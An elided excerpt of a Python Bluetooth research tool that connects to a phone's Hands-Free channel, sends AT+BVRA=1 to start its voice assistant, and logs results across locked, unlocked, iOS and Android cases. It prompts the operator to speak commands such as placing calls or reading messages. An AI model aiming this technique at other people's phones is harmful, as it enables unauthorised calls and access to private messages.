...
def hfp_menu(mac_address, channel=4):
    ...
    try:
        ...
        while True:
            ...
            print("  7. Trigger voice assistant (AT+BVRA=1)")
            print("  8. Stop voice assistant (AT+BVRA=0)")
            ...
            if choice == '1':
                ...
                send_at_command(sock, "AT+BVRA=1", "Triggering voice assistant...")
                print(f"{Colors.OKCYAN}[*] Listening for VA response (5s)...{Colors.ENDC}")
                sock.settimeout(5)
                try:
                    while True:
                        ...
                        if not data:
                            break
                        print(f"{Colors.OKBLUE}{data.strip()}{Colors.ENDC}")
                except socket.timeout:
                    pass
                sock.settimeout(None)
            elif choice == '8':
                send_at_command(sock, "AT+BVRA=0", "Stopping voice assistant...")
            elif choice == '0':
                break
            else:
...
def voice_assistant(mac_address, channel=4):
    """
    Triggers VA via AT+BVRA=1 and logs results for the test matrix:
    locked vs unlocked, iOS vs Android, with/without trusted device.
    """
    print(f"\n{Colors.HEADER}=== VOICE ASSISTANT ==={Colors.ENDC}")


    sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM)
    try:
        print(f"\n{Colors.OKCYAN}[*] Connecting to HFP (channel {channel})...{Colors.ENDC}")
        sock.connect((mac_address, channel))
        print(f"{Colors.OKGREEN}[+] Connected!{Colors.ENDC}\n")
        ...
        # Trigger VA
        print(f"{Colors.WARNING}[!] Triggering voice assistant via AT+BVRA=1{Colors.ENDC}")
        resp = send_at_command(sock, "AT+BVRA=1", "VA activation...")

        print(f"\n{Colors.OKGREEN}[+] VA active. SCO audio routed via OS (PipeWire/PulseAudio).{Colors.ENDC}")
        print(f"{Colors.OKCYAN}    Speak into your laptop mic now.{Colors.ENDC}")
        print(f"{Colors.OKCYAN}    Try: 'call <number>', 'read messages', 'send text', 'open app'{Colors.ENDC}")
        print(f"{Colors.OKCYAN}    Press ENTER when done to stop VA and log results.{Colors.ENDC}\n")

        # Background thread to log any AT events while user talks
        import threading
        ...
        def reader():
            ...
            while not stop_flag.is_set():
                try:
                    data = sock.recv(4096).decode('utf-8', errors='ignore')
                    if data:
                        print(f"{Colors.OKBLUE}[AT] {data.strip()}{Colors.ENDC}")
                        log_lines.append(f"recv: {data.strip()}")
                except socket.timeout:
                    continue
                except Exception:
                    break
        ...
        # Cleanup
        send_at_command(sock, "AT+BVRA=0", "Stopping VA...")
...
def main_menu(mac_address):
    ...
    while True:
        ...
        print("  5. Voice Assistant Experiment (locked/unlocked × iOS/Android)")
        print("  0. Exit")
        ...
        if choice == '1':
            ...
            voice_assistant(mac_address, channels['hfp'])
        elif choice == '0':
